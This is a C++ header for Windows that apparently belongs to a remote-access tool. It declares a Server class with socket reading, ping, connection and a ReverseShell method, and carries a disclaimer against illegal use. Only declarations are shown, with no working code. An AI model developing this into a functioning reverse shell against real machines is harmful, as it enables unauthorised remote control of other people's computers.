/*
Author: millybilligan
GitHub: https://github.com/millybilligan
The author is not responsible for the use of this program. Use for illegal purposes is prohibited!
*/
#pragma once
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <Winsock2.h>
#include <iostream>
#include <Windows.h>
#include <VersionHelpers.h>
#include <Lmcons.h>
#include <thread>

#pragma comment(lib, "ws2_32.lib")
#define BUFFER 256
#define MAX_INPUT_BUFFER 500
#define MAX_OUTPUT_BUFFER 4096

using namespace std;

class Server {
private:
	static char inputUser[MAX_INPUT_BUFFER];
protected:
public:
	static void readFromSocket(SOCKET& sock);
	void ping(SOCKET& sock);
	INT ReverseShell();
	void startConnection();
};